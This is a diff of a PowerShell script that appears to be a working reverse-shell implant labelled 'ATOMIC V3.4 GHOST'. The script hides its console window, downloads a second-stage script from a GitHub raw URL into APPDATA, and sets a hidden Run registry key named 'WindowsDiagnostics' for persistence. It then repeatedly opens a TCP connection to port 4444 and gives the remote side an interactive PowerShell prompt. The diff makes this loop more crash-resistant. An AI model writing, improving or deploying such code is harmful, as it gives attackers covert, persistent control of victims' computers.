@@ -4,36 +4,39 @@ $port = 4444
 $url = 'https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1'
 $installPath = "$env:APPDATA\win_diag.ps1"
 
-# --- 1. WAIT FOR INTERNET (The "Connectivity Gate") ---
-# This prevents the script from crashing if the Wi-Fi isn't ready.
-while (!(Test-Connection -ComputerName google.com -Count 1 -ErrorAction SilentlyContinue)) {
-    Start-Sleep -Seconds 5
-}
-
-# --- 2. SELF-REPAIR & HIDDEN REGISTRY ---
-if (!(Test-Path $installPath)) {
-    (New-Object Net.WebClient).DownloadFile($url, $installPath)
-}
-# Force the Registry key to use -WindowStyle Hidden so no terminal pops up
-$key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$val = "powershell.exe -WindowStyle Hidden -nop -w hidden -f `"$installPath`""
-if ((Get-ItemProperty $key).WindowsDiagnostics -ne $val) {
-    Set-ItemProperty -Path $key -Name "WindowsDiagnostics" -Value $val
-}
-
-# --- 3. INSTANT WINDOW HIDE (Safety Net) ---
-$code = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
-$win = Add-Type -MemberDefinition $code -Name "Win32" -Namespace "Util" -PassThru
-$hwnd = (Get-Process -Id $PID).MainWindowHandle
-if ($hwnd -ne 0) { $win::ShowWindow($hwnd, 0) }
-
-# --- 4. THE CONNECTION LOOP ---
+# --- 1. THE "NO-CRASH" WRAPPER ---
 while($true) {
     try {
+        # --- 2. INSTANT SILENCE ---
+        # We put this in a try block because Add-Type often fails on boot
+        try {
+            $code = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
+            $win = Add-Type -MemberDefinition $code -Name "Win32" -Namespace "Util$([Guid]::NewGuid().ToString().Replace('-',''))" -PassThru
+            $hwnd = (Get-Process -Id $PID).MainWindowHandle
+            if ($hwnd -ne 0) { [void]$win::ShowWindow($hwnd, 0) }
+        } catch { } 
+
+        # --- 3. WAIT FOR NETWORK ---
+        # Loop until we can reach your IP or Google
+        while (!(Test-Connection -ComputerName 8.8.8.8 -Count 1 -ErrorAction SilentlyContinue)) {
+            Start-Sleep -Seconds 5
+        }
+
+        # --- 4. PERSISTENCE REPAIR ---
+        if (!(Test-Path $installPath)) {
+            (New-Object Net.WebClient).DownloadFile($url, $installPath)
+        }
+        $key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $val = "powershell.exe -WindowStyle Hidden -nop -w hidden -f `"$installPath`""
+        if ((Get-ItemProperty $key -ErrorAction SilentlyContinue).WindowsDiagnostics -ne $val) {
+            Set-ItemProperty -Path $key -Name "WindowsDiagnostics" -Value $val
+        }
+
+        # --- 5. THE CONNECTION ---
         $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
         $s = $c.GetStream(); $r = New-Object System.IO.StreamReader($s); $w = New-Object System.IO.StreamWriter($s)
         $w.AutoFlush = $true
-        $w.WriteLine("--- ATOMIC V3.3 GHOST ONLINE: $env:COMPUTERNAME ---")
+        $w.WriteLine("--- ATOMIC V3.4 GHOST ONLINE: $env:COMPUTERNAME ---")
 
         while($c.Connected) {
             $w.Write("PS " + (Get-Location).Path + "> ")
@@ -57,8 +60,9 @@ while($true) {
             }
         }
     } catch { 
-        Start-Sleep -Seconds 20 # Wait and retry if listener is down
+        # If ANYTHING fails (No internet, No listener, Syntax error), wait 20s and restart the whole logic
+        Start-Sleep -Seconds 20 
     } finally {
-        if ($c) { $c.Close() }
+        if ($null -ne $c) { $c.Close() }
     }
 }
